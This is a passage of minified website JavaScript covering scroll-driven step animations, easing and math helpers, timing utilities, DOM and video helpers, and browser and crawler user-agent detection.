e=t.getElementsByClassName(GN)[0];t.style.setProperty("--quote-height",`${e.offsetHeight}px`)}))}onResize(){this.innerHeight=this.innerElement.offsetHeight;this.cssInterpolater.setInterpolations({interpolations:[{id:"--header-opacity",progress:[{from:.1,to:.2,start:0,end:1,easingFunction:CT.CubicBezier.makeEasingFunction(.2,.17,.83,.67)}]}]}),this.applyQueryBubbleOffsets()}onScroll(){let t=or.dom.getElementScrolledPercent(this.el);this.rafProgress.easeTo(t,.16,or.EASE.linear),t>=.2*window.innerHeight/this.el.offsetHeight&&this.el.classList.add(tm),t<=0&&this.el.classList.remove(tm)}onEasedScroll(t){this.cssInterpolater.update(t)}calculateActiveStep(){let t=[],e=window.innerHeight/2;if(this.stepInnerElements.forEach(((i,r)=>{let n=i.getBoundingClientRect(),s=.5*n.height,o=Math.abs(e-(n.top+s));t.push({element:this.stepElements[r],distance:Math.abs(o)})})),t=t.sort(((t,e)=>t.distance>e.distance?1:e.distance>t.distance?-1:0)),t.length){let e=t[0].element,i=this.stepElements.indexOf(e);this.updateActiveStep(i)}}updateActiveStep(t){this.el.classList.contains(tm)&&this.updateActiveStep_(t)}updateActiveStep_(t){this.stepElements.forEach(((e,i)=>{if(i==t){e.classList.add(TT),this.activeStepElement=e;let t=Array.from(e.querySelectorAll("video"));t&&(t=t.filter((t=>"none"!==or.dom.getComputedStyle(t.parentNode).display)),or.dom.whenVideosLoaded(t).then((()=>{or.dom.playAllVideosInElement(e)})))}else e.classList.remove(TT),or.dom.pauseAllVideosInElement(e)}))}dispose_(){this.ev&&this.ev.dispose(),this.evDesktop&&this.evDesktop.dispose(),this.domWatcher&&this.domWatcher.dispose()}},xT=rm,zN=Object.defineProperty,Ps=(t,e)=>{for(var i in e)zN(t,i,{get:e[i],enumerable:!0})},im={};Ps(im,{addDelegatedListener:()=>Bq,addStyles:()=>lq,addStylesToPage:()=>Nq,appendAfter:()=>$q,aspect:()=>_q,closestElementComposed:()=>Vq,copyBase64Image:()=>Sq,createElementFromString:()=>pq,deleteImage:()=>Aq,disableScrolling:()=>Lq,event:()=>dq,fetchAndMakeImage:()=>bq,flushVideos:()=>Cq,forceFocus:()=>xq,forceVOFocus:()=>Iq,getAllTextNodes:()=>px,getComputedStyle:()=>ox,getElementProgressPoint:()=>oq,getElementScrolledPercent:()=>sq,getFocusableElements:()=>ux,getScrollElement:()=>kq,getScrollTop:()=>ax,getScrollTopWithoutTransforms:()=>lx,getScrollYAtPercent:()=>ym,getStyle:()=>Rq,isDisplayNone:()=>hx,isDisplayNoneWithAncestors:()=>fx,isOverlapping:()=>Fq,isVisibleOnScreen:()=>dx,makeBase64ImageFromBlob:()=>Eq,makeImageFromBlob:()=>wq,pauseAllVideosInElement:()=>hq,playAllVideosInElement:()=>nx,removeAllChildren:()=>gq,removeClassByPrefix:()=>Mq,removeElement:()=>mq,removeNativeLazyImage:()=>qq,resetAllVideosInElement:()=>uq,resetForceFocus:()=>cx,runAfterNotTopOfScreen:()=>yq,runAfterWindowLoad:()=>vq,setCssVariable:()=>rx,setCssVariables:()=>aq,setFocusableElementsToTabIndex:()=>Pq,testDescendant:()=>cq,testVideoIsPlaying:()=>ix,unflushVideos:()=>Tq,unorphan:()=>Dq,unsetFocusableElementsToTabIndex:()=>Oq,whenVideosLoaded:()=>sx,whenVideosLoadedInElement:()=>fq});var jN={};Ps(jN,{absZero:()=>Uu,angleDegree:()=>MV,angleDistanceDegree:()=>$V,angleDistanceRadian:()=>RT,angleRadians:()=>RV,aspectRatio:()=>am,asymptoticAverage:()=>n2,boxCollision:()=>LV,calculate2dPointRotation:()=>FV,calculate2dPointRotationWithDistance:()=>NV,calculateBackgroundContain:()=>i2,calculateBackgroundCover:()=>r2,calculateCenterOffset:()=>WV,ceilToPrecision:()=>PV,childProgress:()=>TV,clamp:()=>om,clamp01:()=>lm,clampAsPercent:()=>Os,clampAsProgress:()=>DT,collisionCircVsBox:()=>DV,collisionPointVersusConvexPolygon:()=>kV,damp:()=>JV,degreeToRadian:()=>Gu,direction:()=>BV,distance:()=>qV,ease:()=>e2,fixDigits:()=>PT,flipCoin:()=>AV,floorToPrecision:()=>IV,generateRandomPoints:()=>VV,getProgressInRangeByValue:()=>kT,getRandomFloat:()=>CV,getRandomInt:()=>al,getUniqueRandomInt:()=>OT,getValueInRangeByProgress:()=>zV,int:()=>Hu,int0:()=>SV,interpolateRange:()=>NT,inverseLerp:()=>FT,inverseProgress:()=>YV,isBetween:()=>UV,lerp:()=>es,lerpEase:()=>VT,mix:()=>XV,normalize:()=>jV,radianToDegree:()=>MT,remap:()=>c2,resizeDimensionalBoxToHeight:()=>GV,resizeDimensionalBoxToWidth:()=>HV,roundToPrecision:()=>xV,scaleX:()=>$T,scaleY:()=>LT,sigmoid:()=>l2,sinNormalized:()=>ZV,smoothStart2:()=>qT,smoothStart3:()=>o2,smoothStep:()=>KV,smoothStep2:()=>BT,smoothStop3:()=>a2,step:()=>QV,sum:()=>u2,toFixed:()=>OV,wrap:()=>t2});var YN={};function XN(t){return 0===t||1===t?t:1-Math.cos(t*(Math.PI/2))}function QN(t){return 0===t||1===t?t:Math.sin(t*(Math.PI/2))}function KN(t){return 0===t||1===t?t:-.5*(Math.cos(Math.PI*t)-1)}function ZN(t){return 0===t||1===t?t:t*t}function JN(t){return 0===t||1===t?t:t*(2-t)}function eV(t){return 0===t||1===t?t:t*t*t}function tV(t){return 0===t||1===t?t:t<.5?2*t*t:(4-2*t)*t-1}function rV(t){return 0===t||1===t?t:--t*t*t+1}function iV(t){return 0===t||1===t?t:t<.5?4*t*t*t:(t-1)*(2*t-2)*(2*t-2)+1}function nV(t){return 0===t||1===t?t:t*t*t*t}function sV(t){return 0===t||1===t?t:1- --t*t*t*t}function oV(t){return 0===t||1===t?t:t<.5?8*t*t*t*t:1-8*--t*t*t*t}function aV(t){return 0===t||1===t?t:t*t*t*t*t}function lV(t){return 0===t||1===t?t:1+--t*t*t*t*t}function cV(t){return 0===t||1===t?t:t<.5?16*t*t*t*t*t:1+16*--t*t*t*t*t}function uV(t){return 0===t||1===t?t:Math.pow(2,10*(t-1))}function hV(t){return 0===t||1===t?t:1-Math.pow(2,-10*t)}function fV(t){return 0===t||1===t?t:t<.5?.5*Math.pow(2,10*(2*t-1)):.5*(2-Math.pow(2,-10*(2*t-1)))}function dV(t){return 0===t||1===t?t:1-Math.sqrt(1-t*t)}function pV(t){return 0===t||1===t?t:Math.sqrt(1-(t-1)*(t-1))}function mV(t){return 0===t||1===t?t:t<.5?-.5*(Math.sqrt(1-t*t*4)-1):.5*(Math.sqrt(1-4*(t-1)*(t-1))+1)}function gV(t){return 0===t||1===t?t:t*t*(2.70158*t-1.70158)}function vV(t){return 0===t||1===t?t:(t-1)*(t-1)*(2.70158*(t-1)+1.70158)+1}function yV(t){return 0===t||1===t?t:t<.5?2*t*.5*(2*t)*(2*t*3.5949095-2.5949095):.5*((2*t-2)*(2*t-2)*(3.5949095*(2*t-2)+2.5949095)+2)}function _V(t){return 0===t||1===t?t:Math.pow(2,10*(t-1))*Math.sin((t-1.075)*(2*Math.PI)/.3)*-1}function bV(t){return 0===t||1===t?t:Math.pow(2,-10*t)*Math.sin((t-.075)*(2*Math.PI)/.3)+1}function wV(t){return 0===t||1===t?t:t<.5?Math.pow(2,10*(2*t-1))*Math.sin(2*(2*t-1.1125)*Math.PI/.45)*-.5:.5*Math.pow(2,-10*(2*t-1))*Math.sin(2*(2*t-1.1125)*Math.PI/.45)+1}function IT(t){return 0===t||1===t?t:1-nm(1-t)}function nm(t){return 0===t||1===t?t:t<1/2.75?7.5625*t*t:t<2/2.75?7.5625*(t-1.5/2.75)*(t-1.5/2.75)+.75:t<2.5/2.75?7.5625*(t-2.25/2.75)*(t-2.25/2.75)+.9375:7.5625*(t-2.625/2.75)*(t-2.625/2.75)+.984375}function EV(t){return 0===t||1===t?t:t<.5?.5*IT(2*t):.5*nm(2*t-1)+.5}function sm(t){return t}function Uu(t){return Object.is(t,-0)?0:t}function PT(t,e){return+parseFloat(t).toFixed(e)}function Hu(t){return PT(t,0)}function SV(t){return t>>0}function AV(){return al(0,1)}function CV(t,e){return Math.random()*(e-t)+t}function al(t,e){return Math.floor(Math.random()*(e-t+1))+t}function OT(t,e,i){let r=al(t,e);return r===i?OT(t,e,i):r}function om(t,e,i){return Math.min(Math.max(i,t),e)}function TV(t,e,i,r=!1){let n=i-e,s=om(0,1,t-e);return r&&(s=t-e),s/=n,r?s:Os(s)}function xV(t,e){e=Hu(e);let i=Math.pow(10,e);return Math.round(t*i)/i}function IV(t,e){e=Hu(e);let i=Math.pow(10,e);return Math.floor(t*i)/i}function PV(t,e){e=Hu(e);let i=Math.pow(10,e);return Math.ceil(t*i)/i}function OV(t,e){return+t.toFixed(e)}function RV(t,e,i,r){return Math.atan2(r-e,i-t)}function MV(t,e,i,r){return 180*Math.atan2(r-e,i-t)/Math.PI}function $V(t,e,i){let r=Gu(t),n=Gu(e);return i&&(i=Gu(i)),MT(RT(r,n,i))}function RT(t,e,i){i||(i=2*Math.PI);let r=(e-t)%i;return 2*r%i-r}function Gu(t){return t*(Math.PI/180)}function MT(t){return 180*t/Math.PI}function LV(t,e){return!(t.y+t.height<e.y||t.y>e.y+e.height||t.x+t.width<e.x||t.x>e.x+e.width)}function DV(t,e){let i=t.x-Math.max(e.x,Math.min(t.x,e.x+e.width)),r=t.y-Math.max(e.y,Math.min(t.y,e.y+e.height));return i*i+r*r<t.radius*t.radius}function kV(t,e){let i=!1,r=e.length,n=0,s=r-1;for(let o=0;o<r;o++){let r=e[n],o=e[s];r.y>t.y!=o.y>t.y&&t.x<(o.x-r.x)*(t.y-r.y)/(o.y-r.y)+r.x&&(i=!i),s=n,n++}return i}function FV(t,e,i,r,n){let s=Math.cos(n),o=Math.sin(n);return{x:s*(i-t)+o*(r-e)+t,y:s*(r-e)-o*(i-t)+e}}function NV(t,e,i,r,n,s){let o=n+Math.atan2(r-e,i-t);return{x:i=t+s*Math.cos(o),y:r=e+s*Math.sin(o)}}function VV(t,e,i,r,n){let s=[];for(let o=0;o<t;o++)s.push({x:al(e,i),y:al(r,n)});return s}function qV(t,e,i,r){return Math.sqrt(Math.pow(i-t,2)+Math.pow(r-e,2))}function BV(t,e){return t===e?0:t<e?1:-1}function WV(t,e){return t/2-e/2}function $T(t,e,i){return t*i/e}function LT(t,e,i){return i*e/t}function am(t){return t.width/t.height}function UV(t,e,i,r=!0){let n=Math.min(e,i),s=Math.max(e,i);return r?t>=n&&t<=s:t>n&&t<s}function HV(t,e){return{width:e,height:LT(t.width,t.height,e)}}function GV(t,e){return{width:$T(t.width,t.height,e),height:e}}function Os(t){return om(0,1,Uu(t))}function DT(t){return Os(t)}function lm(t){return Os(t)}function zV(t,e,i){return es(e,i,t)}function kT(t,e,i){return Os((t-e)/(i-e))}function jV(t,e,i){return kT(t,e,i)}function es(t,e,i){let r=lm(i);return(1-r)*t+r*e}function YV(t){return 1-t}function FT(t,e,i,r=!1){return r?(i-t)/(e-t):lm((i-t)/(e-t))}function XV(t,e,i){return t*(1-i)+e*i}function QV(t,e){return e>t?1:0}function KV(t,e,i){let r=Math.max(0,Math.min(1,(i-t)/(e-t)));return r*r*(3-2*r)}function NT(t,e,i,r,n){return es(r,n,DT(t/(i-e)))}function ZV(t){return NT(Math.sin(t)+1,0,2,0,1)}function VT(t,e,i,r=sm){return es(t,e,i=r(i))}function JV(t,e,i,r){return es(t,e,1-Math.exp(-i*r))}function e2(t,e,i,r=sm){return VT(t,e,i,r)}function t2(t,e,i){let r=i-e;return e+((t-e)%r+r)%r}function r2(t,e){let i,r,n,s=am(t);am(e)>=s?(r=t.height,n=t.height/e.height,i=e.width*n):(i=t.width,n=t.width/e.width,r=e.height*n);let o=Math.max(i/e.width,r/e.height),a=Uu(-Math.round((t.height-r)/2)),l=Uu(-Math.round((t.width-i)/2));return{width:Math.round(i),height:Math.round(r),xOffset:l,yOffset:a,scalar:o}}function i2(t,e){let i=t.height/e.height,r=t.width/e.width;return Math.min(i,r)}function n2(t,e,i){return t+(e-t)*i}function qT(t){return t*t}function s2(t){return 1-(1-t)*(1-t)}function o2(t){return t*t*t}function a2(t){return 1-(1-t)*(1-t)*(1-t)}function BT(t,e,i){return es(qT(t),s2(t),e)*i}function l2(t,e){return BT(t,e,t)}function c2(t,e,i,r,n){return es(t,e,FT(i,r,n))}function u2(t){return t.reduce(((t,e)=>t+e),0)}Ps(YN,{easeInBack:()=>gV,easeInBounce:()=>IT,easeInCirc:()=>dV,easeInCubic:()=>eV,easeInElastic:()=>_V,easeInExpo:()=>uV,easeInOutBack:()=>yV,easeInOutBounce:()=>EV,easeInOutCirc:()=>mV,easeInOutCubic:()=>iV,easeInOutElastic:()=>wV,easeInOutExpo:()=>fV,easeInOutQuad:()=>tV,easeInOutQuart:()=>oV,easeInOutQuint:()=>cV,easeInOutSine:()=>KN,easeInQuad:()=>ZN,easeInQuart:()=>nV,easeInQuint:()=>aV,easeInSine:()=>XN,easeOutBack:()=>vV,easeOutBounce:()=>nm,easeOutCirc:()=>pV,easeOutCubic:()=>rV,easeOutElastic:()=>bV,easeOutExpo:()=>hV,easeOutQuad:()=>JN,easeOutQuart:()=>sV,easeOutQuint:()=>lV,easeOutSine:()=>QN,linear:()=>sm});var h2=class{constructor(){this.resolve=()=>{},this.reject=()=>{},this.complete=!1,this.promise=new Promise(((t,e)=>{this.resolve=e=>(this.complete=!0,t(e)),this.reject=t=>(this.complete=!0,e(t))}))}getPromise(){return this.complete?new Promise((t=>{t()})):this.promise}},f2={};Ps(f2,{debounce:()=>ZT,memoize:()=>K2,memoizeSimple:()=>Q2,repeatUntil:()=>X2,runOnceOnChange:()=>ex,runOnlyOnce:()=>Z2,setDefault:()=>J2,throttle:()=>j2,times:()=>eq,wait:()=>Y2,waitUntil:()=>JT});var d2={};Ps(d2,{countdown:()=>z2,createLocalTimeZoneDate:()=>U2,easternTimeToLocalTimeDate:()=>G2,isInBetween:()=>W2,now:()=>ul,pacificTimeToLocalTimeDate:()=>H2,timeDiffMs:()=>mm,utcDateToLocalTimeZone:()=>gm});var p2={};function qi(t,e){return e===Object.prototype.toString.call(t).slice(8,-1).toLowerCase()}function m2(t){return qi(t,"boolean")}function g2(t){return qi(t,"array")}function ll(t){return qi(t,"string")}function v2(t){return qi(t,"date")}function Bo(t){return qi(t,"number")}function y2(t){return qi(t,"function")}function cm(t){return qi(t,"null")}function WT(t){return qi(t,"undefined")}function um(t){return!WT(t)}function _2(t){return qi(t,"regexp")}function b2(t){return qi(t,"object")}function UT(t){return Bo(t)&&t%1==0}function w2(t){return Bo(t)&&!UT(t)}function HT(t,e){return Bo(t)&&t%e==0}function E2(t){return 0!==t&&0==(t&t-1)}function GT(t){return Bo(t)&&HT(t,2)}function S2(t){return Bo(t)&&!GT(t)}function A2(t){return t!=t}function hm(){return fm()||dm()}function fm(){return/iPhone|iPad|iPod/i.test(navigator.userAgent)||pm()}function dm(){return/Android/i.test(navigator.userAgent)}function zu(){return-1!==navigator.userAgent.indexOf("Chrome")&&!cl()}function ju(){return!zu()&&-1!==navigator.userAgent.indexOf("Safari")&&!cl()}function pm(){return-1!==navigator.userAgent.toLowerCase().indexOf("macintosh")&&Boolean(navigator.maxTouchPoints)&&navigator.maxTouchPoints>2}function cl(){return-1!==navigator.userAgent.indexOf("Edge")}function Yu(){return-1!==navigator.userAgent.indexOf("Firefox")}function zT(){return/MSIE\/\d+/.test(navigator.userAgent)}function jT(){return/Edge\/\d+/.test(navigator.userAgent)||/MSIE\/\d+/.test(navigator.userAgent)||/Trident\/\d+/.test(navigator.userAgent)}function C2(){return/\bCrOS\b/.test(navigator.userAgent)}function T2(){return!!window.OffscreenCanvas}function x2(){let t=document.createElement("canvas"),e=!1;return t.toDataURL("image/webp")&&(e=0===t.toDataURL("image/webp").indexOf("data:image/webp")),Yu()&&+navigator.userAgent.match(/Firefox\/(.*)/)[1]>=65&&(e=!0),cl()&&+navigator.userAgent.match(/Edge\/(.*)/)[1]>=18&&(e=!0),e}function I2(){return new Promise((t=>{let e=new Image;e.onload=function(){let i=e.width>0&&e.height>0;t(i)},e.onerror=()=>{t(!1)},e.src="data:image/webp;base64,UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA=="}))}function P2(){return document.body.style.transitionTimingFunction="cubic-bezier(calc(1 * 1),1,1,1)","ease"!==getComputedStyle(document.body).transitionTimingFunction}function O2(){return"ontouchstart"in window||navigator.maxTouchPoints>0}function R2(){return!!window.DeviceOrientationEvent}function M2(){return!!(window.File&&window.FileReader&&window.FileList&&window.Blob)}function $2(){return!!window.createImageBitmap&&!Yu()}function L2(t){return ll(t)&&t.startsWith("#")}function D2(t){return ll(t)&&t.startsWith("rgba(")}function k2(t){return ll(t)&&t.startsWith("rgb(")}function F2(t){let e=parseInt(t,16);return ll(t)&&e.toString(16)===t.toLowerCase()}function XT(){return 0!==performance.timing.loadEventEnd}function N2(t){return t.includes("googleusercontent.com")}function QT(){return window.innerWidth>=window.innerHeight}function V2(){return QT()}function KT(){return window.innerWidth<window.innerHeight}function q2(){return KT()}function B2(){return new RegExp("(googlebot/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)","i").test(navigator.userAgent)}function ul(){return Date.now()}function mm(t,e){return e-t}function W2(t,e,i){return t&&e?i>=t&&i<e:t?i>=t:!!e&&i<e}function gm(t){if(ju())return t;{let e=6e4*t.getTimezoneOffset();return new Date(t.getTime()-e)}}function U2(t){if(ju()){let e=new Date(t),i=6e4*e.getTimezoneOffset();return new Date(e.getTime()+i)}return new Date(t)}function H2(t){return gm(new Date(new Date(t).getTime()+252e5))}function G2(t){return gm(new Date(new Date(t).getTime()+144e5))}function z2(t,e){let i=e.getTime()-t.getTime();return{days:Math.floor(i/864e5),hours:Math.floor(i%864e5/36e5),minutes:Math.floor(i%36e5/6e4),seconds:Math.floor(i%6e4/1e3)}}function ZT(t,e,i){let r;return function(...n){let s=this;i||(clearTimeout(r),r=+setTimeout((()=>{r=void 0,t.apply(s,n)}),e)),i&&void 0===r&&(t.apply(s,n),r=+setTimeout((()=>{r=void 0}),e))}}function j2(t,e){return ZT(t,e,!0)}async function Y2(t){return new Promise((e=>setTimeout(e,t)))}function JT(t,e=0,i=100){let r,n,s=ul(),o=new Promise(((t,e)=>{r=t,n=e})),a=()=>{let o=mm(s,ul());t()?r():e&&o>e?n("Wait until timed out"):setTimeout(a,i)};return a(),o}function X2(t,e,i=0,r=100){let n,s,o=ul(),a=new Promise(((t,e)=>{n=t,s=e})),l=()=>{let a=mm(o,ul());t()?n():i&&a>i?s("Wait until timed out"):(e(),setTimeout(l,r))};return l(),a}function Q2(t){let e=null,i=null;return(...r)=>{let n=JSON.stringify(r);return n===i?e:(i=n,e=t(...r))}}function K2(t){let e={};return(...i)=>{let r=JSON.stringify(i);if(e[r])return e[r];let n=t(...i);return e[r]=n,n}}function Z2(t){return ex((()=>{t()}))}function ex(t){let e=null,i=null;return(...r)=>{let n=JSON.stringify(r);if(n!==i)return i=n,e=t(...r)}}function J2(t,e){return Object.is(t,void 0)?e:t}function eq(t,e){[...Array(t)].forEach(((t,i)=>{e(i)}))}Ps(p2,{android:()=>dm,array:()=>g2,boolean:()=>m2,bot:()=>B2,chrome:()=>zu,chromeOs:()=>C2,cssHex:()=>L2,cssRgb:()=>k2,cssRgba:()=>D2,date:()=>v2,defined:()=>um,edge:()=>cl,even:()=>GT,firefox:()=>Yu,float:()=>w2,functionLike:()=>y2,hex:()=>F2,ie:()=>zT,ieOrEdge:()=>jT,int:()=>UT,ios:()=>fm,ipad:()=>pm,isGoogleCloudLikeUrl:()=>N2,isLandscape:()=>QT,isPortrait:()=>KT,landscape:()=>V2,mobile:()=>hm,multipleOf:()=>HT,nan:()=>A2,nullLike:()=>cm,number:()=>Bo,object:()=>b2,odd:()=>S2,portrait:()=>q2,powerOf2:()=>E2,regex:()=>_2,safari:()=>ju,string:()=>ll,supportingAdvancedCssCalc:()=>P2,supportingCreateImageBitmap:()=>$2,supportingDeviceOrientation:()=>R2,supportingFileApis:()=>M2,supportingOffScreenCanvas:()=>T2,supportingTouch:()=>O2,supportingWebp:()=>x2,supportingWebpAsync:()=>I2,type:()=>qi,undefinedLike:()=>WT,windowLoaded:()=>XT});var tq={};function vm(t,e){let i=0,r=e=>{let r=window.innerWidth;(!hm()||i!==r)&&(t(e),i=r)};return window.addEventListener("resize",r,e),()=>{window.removeEventListener("resize",r)}}function rq(t){return new Promise((e=>setTimeout(e,t)))}function tx(t){let e={ieOrEdge:jT,edge:cl,ie:zT,mobile:hm,safari:ju,chrome:zu,chromeOs:zu,firefox:Yu,ios:fm,ipad:pm,android:dm};for(let i in e)e[i]()&&t.classList.add(i)}Ps(tq,{appendBrowserNameToElement:()=>tx,bom:()=>iq,sleep:()=>rq,smartResize:()=>vm});var iq={smartResize:vm,appendBrowserNameToElement:tx},nq=class{constructor(){this.watcherConfigs=[]}add(t){Array.isArray(t.on)?t.on.forEach((e=>{let i=Object.assign({},t);i.on=e,this.addSingleEvent(i)})):this.addSingleEvent(t)}addSingleEvent(t){let e=e=>{t.runWhen?t.runWhen()&&t.callback(e):t.callback(e)};if(t.listener=e,"smartResize"===t.on)t.remover=vm(e,t.eventOptions||{});else if("resize"===t.on&&t.element!==window){let i=new ResizeObserver((t=>{e(t)}));i.observe(t.element),t.remover=()=>{i.unobserve(t.element)}}else if("mutation"===t.on){let i=new MutationObserver((t=>{e(t)}));i.observe(t.element,t.eventOptions),t.remover=()=>{i.disconnect()}}else t.element,MediaQueryList,t.element.addEventListener(t.on,e,t.eventOptions||{}),t.remover=()=>{t.element.removeEventListener(t.on,e,t.eventOptions||{})};this.watcherConfigs.push(t)}removeById(t){this.watcherConfigs=this.watcherConfigs.filter((e=>{if(e.id&&e.id===t){let t=e.remover;return t&&t(),!1}return e}))}removeAll(){this.watcherConfigs.forEach((t=>{let e=t.remover;e&&e()})),this.watcherConfigs=[]}run(t){this.watcherConfigs.filter((e=>e.id&&e.id===t)).forEach((t=>{t.callback()&&t.callback()}))}dispose(){this.removeAll()}};function sq(t,e=0,i=0,r=!1,n=0){let s,o=t.getBoundingClientRect();s=n||window.innerHeight;let a=(s-(o.top+e))/(o.height-e+i);return r?a:Os(a)}function oq(t,e,i=0,r=0,n=0,s=!1){let o=(Math.abs(t.getBoundingClientRect().top-(e.getBoundingClientRect().top+e.offsetHeight*i))-r)/Math.abs(ym(t,r,n,0,!0)-ym(t,r,n,1,!0));return s?o:Os(o)}function ym(t,e=0,i=0,r,n=!0){let s=window.innerHeight,o=n?ax(t):lx(t);return es(o-s+e,o-s+t.offsetHeight+i,r)}function rx(t,e,i){if(!t)throw new Error("You need specificy a valid element to apply a css variable");t.style.setProperty(e,String(i))}function aq(t,e){for(let i in e)t.style.setProperty(i,String(e[i]))}function lq(t,e){for(let i in e)i.startsWith("--")&&rx(t,i,e[i]);Object.assign(t.style,e)}function cq(t,e){let i=t.parentNode;for(;i;){if(i===e)return!0;i=i.parentNode}return!1}function ix(t){return!t.paused&&!t.ended&&t.readyState>2}function uq(t){Array.from(t.querySelectorAll("video")).forEach((t=>{t.currentTime=0}))}function hq(t,e=!1){Array.from(t.querySelectorAll("video")).forEach((t=>{e&&(t.currentTime=0),t.pause()}))}function nx(t,e=!1){Array.from(t.querySelectorAll("video")).forEach((t=>{if(e&&(t.currentTime=0),!ix(t)){let e=t.play();void 0!==e&&e.then((()=>{})).catch((()=>{}))}}))}function fq(t,e=1e4){return sx(Array.from(t.querySelectorAll("video")),e)}function sx(t,e=1e4){let i=[];return t.forEach((t=>{let r=new h2;i.push(r.getPromise()),JT((()=>4===t.readyState),e,10).then((()=>{r.resolve()}))})),Promise.all(i)}function dq(t,e,i){let r=new CustomEvent(e,{detail:i});t.dispatchEvent(r)}function pq(t,e=!1){if(e){let e=document.createElement("div"),i=document.createRange().createContextualFragment(t);return e.appendChild(i),e.firstElementChild}{let e=document.createElement("div");return e.innerHTML=t.trim(),e.firstChild}}function mq(t){t.parentNode.removeChild(t)}function gq(t){for(;t.firstChild;)t.removeChild(t.firstChild)}function vq(t){window.setTimeout((()=>{XT()?t():window.addEventListener("load",(()=>{t()}),{once:!0})}))}function yq(t){0!==window.scrollY?t():window.addEventListener("scroll",(()=>{t()}),{once:!0,passive:!0})}function _q(){return window.innerWidth/window.innerHeight}function ox(t){return window.getComputedStyle(t)}function bq(t){return new Promise((e=>{fetch(t).then((t=>t.blob())).then((t=>{let i=t,r=document.createElement("img");r.decoding="async",r.onload=()=>{e(r)},r.src=URL.createObjectURL(i)}))}))}function wq(t){return new Promise((e=>{let i=document.createElement("img");i.decoding="async",i.onload=()=>{i.onload=null,e(i)},i.src=URL.createObjectURL(t)}))}function Eq(t){return new Promise((e=>{let i=new FileReader;i.readAsDataURL(t),i.addEventListener("load",(()=>{let t=document.createElement("img");t.src=i.result,t.onload=()=>{t.onload=null,e(t)}}),{once:!0})}))}function Sq(t){return new Promise((e=>{let i=document.createElement("img");i.src=t.src,i.onload=()=>{i.onload=null,e(i)}}))}function Aq(t){t&&(t.src&&(t.src.startsWith("blob:")||t.src.startsWith("data:"))&&(URL.revokeObjectURL(t.src),t.src=""),t=null)}function Cq(t,e=""){Array.from(t.querySelectorAll("video")).forEach((t=>{Array.from(t.querySelectorAll("source")).forEach((t=>{let i=t.getAttribute(e)||t.src;t.setAttribute("data-video-src",i),t.removeAttribute("src"),t=null})),t.load()}))}function Tq(t,e=!1){Array.from(t.querySelectorAll("video")).forEach((t=>{Array.from(t.querySelectorAll("source")).forEach((t=>{if(!t.hasAttribute("data-video-src"))return;let e=t.getAttribute("data-video-src");t.setAttribute("src",e)})),t.load()})),e||nx(t)}function ax(t,e=!1){return t?e&&t.offsetParent?t.getBoundingClientRect().top-t.offsetParent.getBoundingClientRect().top+window.scrollY:t.getBoundingClientRect().top+window.scrollY:0}function lx(t){let e=0;do{e+=t.offsetTop,t=t.offsetParent}while(t);return e}function xq(t){cx();let e=t.getAttribute("tabindex");um(e)&&!cm(e)?t.setAttribute("forcetabindex",e):t.setAttribute("forcetabindex","none"),t.setAttribute("tabindex","-1"),t.focus()}function cx(){Array.from(document.querySelectorAll("[forcetabindex]")).forEach((t=>{let e=t.getAttribute("forcetabindex");um(e)&&!cm(e)&&"none"!==e?t.setAttribute("tabindex",e):t.removeAttribute("tabindex"),t.removeAttribute("forcetabindex")}))}function Iq(t,e=10,i=10){let r=e,n=i;t.setAttribute("tabindex","0"),t.blur();let s=0,o=window.setInterval((()=>{t.focus(),s++,s>=n&&window.clearInterval(o)}),r)}function ux(t){return Array.from(t.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'))}function Pq(t,e){ux(t).forEach((t=>{let i=t.tabIndex;t.hasAttribute("originalTabIndex")||t.setAttribute("originalTabIndex",i+""),t.tabIndex=e}))}function Oq(t){Array.from(t.querySelectorAll("[originalTabIndex]")).forEach((t=>{let e=t.getAttribute("originalTabIndex")||"";t.tabIndex=+e}))}function Rq(t){return window.getComputedStyle(t)}function hx(t){return"none"===window.getComputedStyle(t).display}function fx(t){return!!hx(t)||!!t.parentElement&&fx(t.parentElement)}function dx(t){return!!(t=>{let e=ox(t);return!("1"!==e.opacity||"hidden"===e.visibility||"none"===e.display)})(t)&&(!t.parentElement||dx(t.parentElement))}function Mq(t,e){let i=new RegExp("\\b"+e+".*?\\b","g");return t.className=t.className.replace(i,""),t}function px(t){let 